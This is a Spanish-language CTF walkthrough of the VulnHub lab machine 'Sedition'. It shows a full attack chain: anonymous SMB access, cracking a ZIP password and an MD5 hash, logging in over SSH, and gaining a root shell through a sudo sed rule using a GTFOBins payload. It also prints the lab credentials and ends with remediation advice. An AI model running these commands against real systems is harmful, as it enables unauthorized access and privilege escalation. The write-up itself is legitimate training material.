<div align="center">

# 🏴 Sedition — VulnHub

**Plataforma:** VulnHub · **OS:** Linux Debian 12 · **Dificultad:** Fácil-Media · **Estado:** Rooted ✅

**Cadena completa de explotación: SMB → cracking ZIP/MD5 → SSH → MariaDB → GTFOBins (sed) → root**

</div>

---

## 📑 Tabla de contenidos

- [Resumen](#-resumen)
- [Información de la máquina](#ℹ️-información-de-la-máquina)
- [1. Reconocimiento](#-1-reconocimiento--escaneo-de-puertos)
- [2. Enumeración SMB](#️-2-enumeración-smb-sin-autenticación)
- [3. Cracking del ZIP](#-3-cracking-del-zip)
- [4. Acceso SSH](#-4-identificación-de-usuario-válido-y-acceso-ssh)
- [5. Enumeración MariaDB](#️-5-enumeración-de-mariadb)
- [6. Cracking MD5](#-6-cracking-del-hash-md5)
- [7. Pivote de usuario](#-7-pivote-de-usuario-cowboy--debian)
- [8. Escalada de privilegios](#-8-escalada-de-privilegios--gtfobins-sed)
- [9. Flags](#-9-flags)
- [Recomendaciones](#️-recomendaciones-de-remediación)
- [Herramientas](#-herramientas-utilizadas)

---

## 📋 Resumen

Cadena de explotación de caja negra sobre un servidor Linux (Debian 12) que combina enumeración SMB anónima, cracking offline de contraseñas (ZIP y MD5), fuerza bruta SSH, enumeración de MariaDB y escalada de privilegios abusando de un permiso `sudo` mal configurado sobre el binario `sed` (GTFOBins).

**Kill chain:**

\```
SMB anónimo → secretito.zip
   → Cracking ZIP (sebastian)
   → password interna (elbunkermolagollon123)
   → SSH válido (cowboy)
   → MariaDB (bunker.users) → hash MD5 de debian
   → Cracking MD5 (password1)
   → su debian → sudo -l → NOPASSWD /usr/bin/sed
   → GTFOBins → root 👑
\```

---

## ℹ️ Información de la máquina

| Campo | Valor |
|---|---|
| **Nombre** | Sedition |
| **Plataforma** | VulnHub / VirtualBox (red local) |
| **IP objetivo** | `10.0.2.11` |
| **Nombre NetBIOS** | SEDITION |
| **Sistema operativo** | Linux Debian 12 |
| **Dificultad** | Fácil-Media |
| **Resultado** | Compromiso total (root) + flags de usuario y root |

---

## 🔍 1. Reconocimiento — Escaneo de puertos

Todo pentest de caja negra empieza por identificar la superficie de ataque expuesta:

\```bash
nmap -sC -sV -p- -T4 -oN nmap_full.txt 10.0.2.11
\```

**Resultado relevante:**

\```
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
65535/tcp open  ssh         OpenSSH 9.2p1 Debian 12
\```

> 💡 **Nota:** SSH está desplazado al puerto **65535** en lugar del estándar 22 — una medida de seguridad por oscuridad. Por eso se escanean los 65535 puertos (`-p-`) en vez de limitarse a los más comunes.

---

## 🗂️ 2. Enumeración SMB sin autenticación

\```bash
smbclient -L //10.0.2.11/ -N
\```

`-N` fuerza una sesión nula (sin usuario ni contraseña). Se encontró el recurso compartido **`backup`**:

\```bash
smbclient //10.0.2.11/backup -N
smb: \> ls
smb: \> get secretito.zip
\```

`secretito.zip` contenía un único archivo: `password`.

---

## 🔓 3. Cracking del ZIP

\```bash
# Extraer el hash del ZIP
zip2john secretito.zip > secretito_hash.txt

# Ataque de diccionario
john --wordlist=/usr/share/wordlists/rockyou.txt secretito_hash.txt
john --show secretito_hash.txt
\```

✅ **Contraseña recuperada:** `sebastian`

\```bash
unzip -P sebastian secretito.zip
cat password
\```

📄 **Contenido:** `elbunkermolagollon123`

---

## 🔑 4. Identificación de usuario válido y acceso SSH

\```bash
hydra -l cowboy -p 'elbunkermolagollon123' ssh://10.0.2.11:65535
\```

✅ **Credenciales válidas:** `cowboy : elbunkermolagollon123`

\```bash
ssh cowboy@10.0.2.11 -p 65535
id
sudo -l    # cowboy no tiene privilegios sudo
\```

---

## 🗄️ 5. Enumeración de MariaDB

Se reutilizó la misma contraseña, una práctica común (y peligrosa) de reutilización de credenciales entre servicios:

\```bash
mysql -u cowboy -p
\```

\```sql
SHOW DATABASES;
USE bunker;
SHOW TABLES;
SELECT * FROM users;
\```

**Resultado:**

\```
user: debian
password: 7c6a180b36896a0a8c02787eeafb0e4c   (MD5)
\```

---

## 💥 6. Cracking del hash MD5

\```bash
hashcat -m 0 -a 0 7c6a180b36896a0a8c02787eeafb0e4c /usr/share/wordlists/rockyou.txt
\```

✅ **Contraseña recuperada:** `password1`

---

## 👤 7. Pivote de usuario: cowboy → debian

\```bash
su debian
id
sudo -l
\```

🎯 **Resultado clave:**

\```
User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
\```

---

## 👑 8. Escalada de privilegios — GTFOBins (sed)

\```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
\```

**Desglose del comando:**

| Fragmento | Función |
|---|---|
| `sudo sed` | Ejecuta `sed` como root (permitido sin contraseña por sudoers) |
| `-n` | Suprime la salida automática de `sed` |
| `1e exec sh 1>&0` | En la línea 1, el comando `e` ejecuta `exec sh 1>&0`, sustituyendo el proceso por una shell interactiva con stdout redirigido al mismo descriptor que stdin |
| `/etc/hosts` | Archivo de relleno; su contenido nunca llega a procesarse |

\```bash
id
whoami
\```

\```
uid=0(root) gid=0(root) grupos=0(root)
root
\```

🏆 **Root obtenido.**

---

## 🚩 9. Flags

\```bash
find / -iname "*flag*" 2>/dev/null
\```

| Flag | Valor | Ubicación |
|---|---|---|
| 👤 Usuario | `pinguinitopinguinazo` | `/home/debian/flag.txt` |
| 👑 Root | `laflagdelbunkerderootmolaaunmas` | `/root` |

---

## 🛡️ Recomendaciones de remediación

- 🔒 Deshabilitar sesiones nulas (anónimas) en Samba.
- 📁 No almacenar archivos de credenciales en recursos compartidos accesibles por red, ni siquiera protegidos con contraseña.
- 🔑 Usar contraseñas robustas que no estén en diccionarios públicos (rockyou.txt).
- 🚪 No depender de puertos no estándar como única medida de seguridad para SSH.
- #️⃣ Nunca almacenar contraseñas con MD5; usar bcrypt/scrypt/Argon2 con salt.
- ♻️ Evitar la reutilización de contraseñas entre servicios.
- 📜 Auditar `/etc/sudoers`: nunca otorgar `NOPASSWD` sobre binarios peligrosos según [GTFOBins](https://gtfobins.github.io/).

---

## 🧰 Herramientas utilizadas

`nmap` · `smbclient` · `zip2john` · `john the ripper` · `hydra` · `mysql client` · `hashcat` · GTFOBins (`sed`)

---

<div align="center">

*Writeup por [felipea333](https://github.com/felipea333) — parte de la colección [CTF-writeups](https://github.com/felipea333/CTF-writeups)*

</div>
